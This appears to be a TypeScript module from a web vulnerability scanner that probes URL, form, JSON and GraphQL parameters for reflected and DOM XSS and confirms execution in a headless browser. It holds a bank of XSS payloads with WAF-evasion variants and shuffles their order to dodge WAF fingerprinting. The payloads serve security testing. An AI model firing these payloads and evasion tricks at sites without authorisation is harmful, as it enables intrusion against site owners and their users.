import { buildPayloadTarget, PayloadFormat } from "../payloads";
import { ScannerFinding } from "./sqli";

// ─────────────────────────────────────────────────────────────────────────────
// XSS PAYLOAD BANK — WAF-evasion variants included
// Payloads are shuffled per-scan (see shufflePayloads) to prevent WAF
// fingerprinting based on a fixed request sequence.
// ─────────────────────────────────────────────────────────────────────────────

const XSS_PAYLOADS_BANK: string[] = [
  // ── Minimal tag markers (lowest WAF signature risk) ──────────────────────
  "<vulnscanXSStag>",
  "<VULNSCANXSSTAG>",                                        // mixed-case bypass

  // ── Classic script injection ──────────────────────────────────────────────
  "<script>/*vulnscan*/</script>",
  "<Script>/*vulnscan*/</Script>",                           // mixed-case evasion
  "<scr\x00ipt>alert(1)</scr\x00ipt>",                      // null-byte splice

  // ── Attribute break-out / event handlers ─────────────────────────────────
  `"><img src=x onerror=alert('vulnscan')>`,
  `"><IMG SRC=x ONERROR=alert('vulnscan')>`,                 // upper-case attr
  `"><img src=x onerror=alert\`vulnscan\`>`,                 // template-literal call
  `" onmouseover="alert('vulnscan')"`,
  `" onfocus="alert('vulnscan')" autofocus="`,

  // ── JS context break-out ─────────────────────────────────────────────────
  `';alert('vulnscan');//`,
  `\`;alert('vulnscan');//`,                                 // back-tick quote

  // ── SVG / namespace tricks ────────────────────────────────────────────────
  `<svg onload=alert(1)>`,
  `<svg/onload=alert(1)>`,                                   // no-space evasion
  `<svg><script>alert(1)</script></svg>`,
  `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">`,

  // ── HTML entity / Unicode encoding ───────────────────────────────────────
  `<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>`,  // HTML hex entities
  `<img src=x onerror=\u0061\u006C\u0065\u0072\u0074(1)>`,  // Unicode escapes
  `%3Cscript%3Ealert(1)%3C/script%3E`,                      // URL-encoded

  // ── Protocol-based ───────────────────────────────────────────────────────
  `javascript:alert('vulnscan')`,
  `JaVaScRiPt:alert('vulnscan')`,                           // mixed-case protocol

  // ── onerror handler with innocuous src ───────────────────────────────────
  `<img src="" onerror="document.title='VULNSCAN'">`,

  // ── Polyglot (fires in HTML, attribute, JS, URL contexts) ────────────────
  `jaVasCript:/*-/*\`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e`,

  // ── CSS injection with expression ────────────────────────────────────────
  `<style>*{x:expression(alert(1))}</style>`,

  // ── details/summary HTML5 event ───────────────────────────────────────────
  `<details open ontoggle=alert(1)>`,
];

// ─────────────────────────────────────────────────────────────────────────────
// SHUFFLE UTIL — Fisher-Yates, returns a new array (original unchanged)
// ─────────────────────────────────────────────────────────────────────────────

/**
 * Returns a shallow copy of `arr` with elements in a random order.
 * Called once per probe invocation so each scan uses a unique payload sequence,
 * preventing WAF signature learning from a fixed request pattern.
 */
function shufflePayloads<T>(arr: T[]): T[] {
  const copy = [...arr];
  for (let i = copy.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [copy[i], copy[j]] = [copy[j], copy[i]];
  }
  return copy;
}

// ─────────────────────────────────────────────────────────────────────────────
// BROWSER EXECUTION VERIFIER
// ─────────────────────────────────────────────────────────────────────────────

/**
 * Opens a candidate XSS URL in the configured headless browser and checks
 * whether the injected payload *executes* (not just appears in HTML text).
 *
 * Strategy:
 *  1. Patches `window.alert`, `window.confirm`, `window.prompt` to set a
 *     `window.__XSS_FIRED__` flag instead of showing a dialog.
 *  2. Hooks `window.onerror` to catch thrown exceptions from injected scripts.
 *  3. Navigates to `testUrl` — if any patched handler fires, execution is
 *     confirmed.
 *
 * Falls back gracefully (returns false) when:
 *  - No browser service is configured and we are on Vercel.
 *  - Playwright is not available (acquireBrowser returns null).
 *  - Navigation times out or throws.
 *
 * @param testUrl  The full URL with the XSS payload already in the query string.
 * @param log      Logging callback.
 * @param scanId   Used to key the browser pool slot.
 * @returns true if the payload fired in the browser; false otherwise.
 */
export async function browserVerifyXssExecution(
  testUrl: string,
  log: (msg: string) => void,
  scanId: string,
): Promise<boolean> {
  // ── Path A: External browser service ──────────────────────────────────────
  const serviceUrl = process.env.BROWSER_SERVICE_URL;
  if (serviceUrl) {
    try {
      const resp = await fetch(`${serviceUrl.replace(/\/$/, "")}/xss-verify`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ url: testUrl }),
        signal: AbortSignal.timeout(20000),
      });
      if (resp.ok) {
        const data = await resp.json() as { fired?: boolean };
        if (data.fired) {
          log(`🧪  Browser XSS execution confirmed via browser service: ${testUrl}`);
          return true;
        }
      }
    } catch {
      // service unavailable — fall through to local Playwright
    }
  }

  // ── Path B: Vercel — no local browser available ───────────────────────────
  if (process.env.VERCEL || process.env.NEXT_PUBLIC_VERCEL) {
    return false;
  }

  // ── Path C: Local Playwright pool ─────────────────────────────────────────
  let acquireBrowserFn: ((id: string) => Promise<import("playwright").Browser | null>) | undefined;
  let releaseBrowserFn: ((id: string) => Promise<void>) | undefined;
  try {
    const pool = await import("../../browser-pool");
    acquireBrowserFn = pool.acquireBrowser;
    releaseBrowserFn = pool.releaseBrowser;
  } catch {
    return false;
  }

  const slotId = `xss-verify-${scanId}-${Date.now()}`;
  const browser = await acquireBrowserFn(slotId);
  if (!browser) return false;

  try {
    const context = await browser.newContext({
      javaScriptEnabled: true,
      ignoreHTTPSErrors: true,
    });
    const page = await context.newPage();

    // Instrument the page BEFORE navigation so the script runs early
    await page.addInitScript(() => {
      (window as any).__XSS_FIRED__ = false;
      // Patch dialog functions
      const mark = () => { (window as any).__XSS_FIRED__ = true; };
      (window as any).alert   = mark;
      (window as any).confirm = mark;
      (window as any).prompt  = mark;
      // Catch script errors from onerror handlers
      window.addEventListener("error", () => mark());
    });

    try {
      await page.goto(testUrl, { waitUntil: "domcontentloaded", timeout: 15000 });
    } catch {
      // timeout is acceptable — check the flag anyway
    }

    // Short wait for async scripts / event handlers to fire
    await page.waitForTimeout(1500).catch(() => {});

    const fired: boolean = await page.evaluate(
      () => !!(window as any).__XSS_FIRED__
    ).catch(() => false);

    await context.close();

    if (fired) {
      log(`🧪  Browser XSS execution confirmed via Playwright: ${testUrl}`);
    }
    return fired;
  } catch {
    return false;
  } finally {
    await releaseBrowserFn!(slotId);
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// REFLECTED XSS — MULTI-FORMAT PROBE
// ─────────────────────────────────────────────────────────────────────────────

/**
 * Probes a parameter for reflected XSS across URL, form, JSON, and GraphQL
 * delivery formats.
 *
 * Enhancements:
 *  - Payload list is **shuffled** before each invocation (WAF-evasion sequencing).
 *  - On first reflection hit, `browserVerifyXssExecution` is called to confirm
 *    actual script execution in a real browser context, upgrading confidence.
 */
export async function probeReflectedXSSMultiFormat(
  targetUrl: string,
  paramName: string,
  format: PayloadFormat = "URL_PARAM",
  fields: string[] = [paramName],
  authedFetch: (url: string, init?: RequestInit) => Promise<Response | null>,
  log?: (msg: string) => void,
  scanId?: string,
): Promise<ScannerFinding | null> {
  // Randomize payload order each invocation
  const payloads = shufflePayloads(XSS_PAYLOADS_BANK);

  for (const payload of payloads) {
    try {
      const { fetchUrl, options } = buildPayloadTarget(
        targetUrl,
        format === "URL_PARAM" ? "GET" : "POST",
        paramName,
        payload,
        format,
        fields,
      );
      const resp = await authedFetch(fetchUrl, options);
      if (!resp) continue;
      const text = await resp.text();

      // ── Reflection check (all common HTML encoding variants) ──────────────
      const htmlEncodedForms = [
        payload.replace(/</g, "&lt;").replace(/>/g, "&gt;"),
        payload.replace(/"/g, "&quot;"),
        payload.replace(/'/g, "&#x27;"),
        payload.replace(/'/g, "&#39;"),
        payload.replace(/</g, "&amp;lt;").replace(/>/g, "&amp;gt;"),
      ];
      const isEncoded = htmlEncodedForms.some(enc => text.includes(enc));
      const isRawReflected = text.includes(payload) && !isEncoded;

      if (!isRawReflected) continue;

      // ── Browser execution verification ────────────────────────────────────
      let execConfirmed = false;
      if (scanId && log && (format === "URL_PARAM")) {
        execConfirmed = await browserVerifyXssExecution(fetchUrl, log, scanId);
      }

      const confidence = execConfirmed ? 0.93 : 0.90;
      const verifyStep = execConfirmed
        ? "Browser (Playwright/headless) confirmed payload execution — alert() fired"
        : "Verified unescaped execution context in HTTP response body";

      return {
        type: "xss",
        severity: "HIGH",
        url: targetUrl,
        parameter: paramName,
        evidence: execConfirmed
          ? `Reflected XSS CONFIRMED (browser-executed): payload '${payload}' reflected unencoded AND executed in a real browser context (window.alert fired) for parameter '${paramName}' via ${format}.`
          : `Reflected XSS (reflection detected): payload '${payload}' reflected unescaped in server response for parameter '${paramName}' via ${format}.`,
        cvssScore: 7.2,
        cveId: "CWE-79",
        confidence,
        validationSteps: [
          `Injected payload '${payload}' into parameter '${paramName}' via ${format} (randomized payload order — WAF evasion)`,
          verifyStep,
        ],
        isVerified: true,
      };
    } catch { /* try next payload */ }
  }
  return null;
}

// ─────────────────────────────────────────────────────────────────────────────
// DOM XSS SINK ANALYZER
// ─────────────────────────────────────────────────────────────────────────────

/**
 * Analyzes DOM XSS sink execution logs captured by Playwright during JS hydration.
 */
export function analyzeDomXssEvents(
  url: string,
  events?: { sink: string; payloadSnippet: string }[],
): ScannerFinding | null {
  if (!events || events.length === 0) return null;
  const evt = events[0];

  return {
    type: "dom-xss",
    severity: "HIGH",
    url,
    evidence: `Client-side DOM XSS sink execution detected in browser context (${evt.sink}): "${evt.payloadSnippet}"`,
    cvssScore: 7.5,
    cveId: "CWE-79",
    confidence: 0.95,
    validationSteps: [
      `Headless browser evaluated client-side scripts on page ${url}`,
      `Captured untrusted input execution inside JavaScript sink '${evt.sink}'`,
    ],
    isVerified: true,
  };
}
